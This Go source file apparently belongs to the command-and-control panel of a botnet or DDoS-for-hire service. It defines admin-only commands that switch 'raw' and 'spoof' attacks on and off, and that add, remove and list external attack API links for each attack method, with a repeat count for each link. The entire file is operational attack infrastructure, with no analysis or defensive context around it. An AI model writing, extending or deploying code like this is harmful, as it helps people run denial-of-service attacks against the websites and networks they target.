package commands

import (
	"cnc/internal"
	"cnc/internal/database"
	"cnc/internal/master/command"
	"cnc/internal/master/sessions"
	"fmt"
	"github.com/alexeyco/simpletable"
	"net/url"
	"strconv"
)

func handleAttackCommand(session *sessions.Session, ctx *command.Context, enable bool) error {
	t, err := ctx.String("type")
	if err != nil {
		return err
	}

	switch t {
	case "raw":
		internal.RawAttacksEnabled = enable

		status := "enabled"
		if !enable {
			status = "disabled"
		}

		return session.Notification("Raw attacks " + status + ".")
	case "api", "spoof":
		internal.ApiAttacksEnabled = enable

		status := "enabled"
		if !enable {
			status = "disabled"
		}

		return session.Notification("API attacks " + status + ".")
	}

	return session.Notification("Type not found!")
}

func init() {
	var disableCommand = &command.Command{
		Aliases:     []string{"disable", "false", "off"},
		Description: "Disable attacks.",
		Arguments: []*command.Argument{
			command.NewArgument("type", "raw", command.ArgumentString, false),
		},
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			return handleAttackCommand(session, ctx, false)
		},
	}

	var enableCommand = &command.Command{
		Aliases:     []string{"enable", "true", "on"},
		Description: "Enable attacks.",
		Arguments: []*command.Argument{
			command.NewArgument("type", "raw", command.ArgumentString, false),
		},
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			return handleAttackCommand(session, ctx, true)
		},
	}

	var addApiCommand = &command.Command{
		Aliases:     []string{"addapi", "addspoof"},
		Description: "Add an API to a method.",
		Arguments: []*command.Argument{
			command.NewArgument("method", "http", command.ArgumentString, true),
			command.NewArgument("api_id", nil, command.ArgumentString, true),
			command.NewArgument("api_link", nil, command.ArgumentString, true),
			command.NewArgument("times", 1, command.ArgumentInteger, false),
		},
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			method, err := ctx.String("method")
			if err != nil {
				return err
			}

			apiId, err := ctx.String("api_id")
			if err != nil {
				return err
			}

			apiLink, err := ctx.String("api_link")
			if err != nil {
				return err
			}

			times, err := ctx.Integer("times")
			if err != nil {
				return err
			}

			if err := database.API.Insert(apiId, apiLink, method, times); err != nil {
				return err
			}

			return session.Notification("Inserted API into database (x%d)", times)
		},
	}

	var removeApiCommand = &command.Command{
		Aliases:     []string{"delapi", "delspoof"},
		Description: "Removes an API from a method.",
		Arguments: []*command.Argument{
			command.NewArgument("api_id", nil, command.ArgumentString, true),
			command.NewArgument("method", "", command.ArgumentString, false),
		},
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			apiId, err := ctx.String("api_id")
			if err != nil {
				return err
			}

			method, err := ctx.String("method")
			if err != nil {
				return err
			}

			apis, err := database.API.SelectByName(apiId)
			if err != nil {
				return err
			}

			for _, api := range apis {
				if len(method) > 0 && api.Method != method {
					continue
				}

				if err := api.Drop(); err != nil {
					return err
				}

				uri, _ := url.Parse(api.ApiLink)
				_ = session.Println("Successfully dropped ", uri.Hostname(), " which was part of '", api.Method, "'")
			}

			return nil
		},
	}

	var listApiCommand = &command.Command{
		Aliases:     []string{"listapi", "listspoof"},
		Description: "Lists all APIs.",
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			api, err := database.API.SelectAll()
			if err != nil {
				return err
			}

			var table = simpletable.New()

			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "#"},
					{Align: simpletable.AlignCenter, Text: "ID"},
					{Align: simpletable.AlignCenter, Text: "Hostname"},
					{Align: simpletable.AlignCenter, Text: "Method"},
					{Align: simpletable.AlignCenter, Text: "Repeats"},
				},
			}

			for i, cmd := range api {
				uri, _ := url.Parse(cmd.ApiLink)

				cell := []*simpletable.Cell{
					{Align: simpletable.AlignLeft, Text: fmt.Sprint(i)},
					{Align: simpletable.AlignLeft, Text: cmd.ApiName},
					{Align: simpletable.AlignLeft, Text: uri.Hostname()},
					{Align: simpletable.AlignLeft, Text: cmd.Method},
					{Align: simpletable.AlignLeft, Text: strconv.Itoa(cmd.Times)},
				}

				table.Body.Cells = append(table.Body.Cells, cell)
			}

			table.SetStyle(simpletable.StyleCompact)
			return session.Table(table, 1)
		},
	}

	command.Create(&command.Command{
		Aliases:     []string{"attacks"},
		Description: "Manage attack vectors.",
		Roles:       []string{"admin"},
		SubCommands: []*command.Command{
			enableCommand,
			disableCommand,
			addApiCommand,
			listApiCommand,
			removeApiCommand,
		},
		Executor: command.SubCommandListCommand.Executor,
	})
}
